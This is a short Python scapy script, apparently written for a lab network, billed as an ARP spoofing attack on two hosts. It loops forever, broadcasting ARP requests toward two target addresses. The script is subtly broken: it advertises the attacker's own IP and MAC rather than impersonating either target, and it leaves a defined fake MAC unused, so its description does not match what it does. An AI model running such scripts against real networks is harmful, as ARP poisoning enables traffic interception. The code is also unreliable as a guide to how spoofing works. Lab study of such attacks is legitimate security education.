#!/usr/bin/env python3
from scapy.all import *

# Target IPs (Hosts A & B)
IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

# Attacker's Details
MAC_ATTACKER = "02:42:0a:09:00:69"  # Attacker's MAC Address
FAKE_MAC = "0a:bc:cd:de:ef:ff"      # Fake MAC Address
IP_ATTACKER = "10.9.0.105"          # Attacker's IP

def send_arp_packets(src_mac, src_ip, dst_ip):
    print("Initiating ARP Request...")
    broadcast = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
    arp_req = ARP(hwsrc=src_mac, psrc=src_ip, pdst=dst_ip, op=1)
    packet = broadcast / arp_req
    sendp(packet, iface="eth0", verbose=False)

def main():
    print("Commencing ARP spoof attack on both hosts...")
    while True:
        send_arp_packets(MAC_ATTACKER, IP_ATTACKER, IP_A)
        send_arp_packets(MAC_ATTACKER, IP_ATTACKER, IP_B)
        time.sleep(5)

if __name__ == "__main__":
    main()
